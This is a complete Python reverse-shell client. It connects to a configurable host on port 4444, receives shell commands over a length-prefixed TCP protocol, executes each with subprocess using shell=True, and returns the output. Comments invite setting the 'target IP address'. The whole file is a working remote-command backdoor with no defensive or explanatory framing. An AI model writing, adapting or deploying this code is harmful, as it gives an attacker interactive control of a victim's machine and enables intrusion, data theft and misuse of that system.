#!/usr/bin/env python3
"""
Simple command client that connects to a predefined IP address and waits for commands.
"""

import socket
import subprocess
import sys
import os
import threading
import json

def connect_to_server(host, port):
    """Establish connection to the command server."""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        print(f"Connected to {host}:{port}")
        return client
    except Exception as e:
        print(f"Connection failed: {str(e)}")
        return None

def execute_command(command):
    """Execute a shell command and return the output."""
    try:
        if command.strip().lower() == "exit":
            return "exit"

        # Use subprocess to execute the command
        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=30
        )

        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "Command executed successfully (no output)"

        return output

    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def send_response(client, response):
    """Send response back to the server."""
    try:
        # Send response length first
        response_bytes = response.encode('utf-8')
        length = len(response_bytes)
        client.send(length.to_bytes(4, byteorder='big'))
        client.send(response_bytes)
    except Exception as e:
        print(f"Failed to send response: {str(e)}")
        return False
    return True

def receive_command(client):
    """Receive a command from the server."""
    try:
        # Receive command length
        length_bytes = client.recv(4)
        if not length_bytes:
            return None

        length = int.from_bytes(length_bytes, byteorder='big')

        # Receive the command
        command = b""
        while len(command) < length:
            chunk = client.recv(length - len(command))
            if not chunk:
                return None
            command += chunk

        return command.decode('utf-8')

    except Exception as e:
        print(f"Failed to receive command: {str(e)}")
        return None

def command_loop(client):
    """Main loop to receive and execute commands."""
    while True:
        try:
            # Receive command from server
            command = receive_command(client)

            if not command:
                print("Server disconnected")
                break

            print(f"Received command: {command}")

            # Execute the command
            response = execute_command(command)

            # Send response back to server
            if response == "exit":
                print("Exit command received")
                break

            if not send_response(client, response):
                break

        except Exception as e:
            print(f"Error in command loop: {str(e)}")
            break

    try:
        client.close()
    except:
        pass

def main():
    # Predefined connection parameters
    HOST = "127.0.0.1"  # Change this to the target IP address
    PORT = 4444         # Change this to the target port

    print(f"Attempting to connect to {HOST}:{PORT}")

    # Connect to server
    client = connect_to_server(HOST, PORT)

    if not client:
        sys.exit(1)

    try:
        # Start command loop
        command_loop(client)
    except KeyboardInterrupt:
        print("\nClient interrupted")
    finally:
        try:
            client.close()
        except:
            pass

if __name__ == "__main__":
    main()
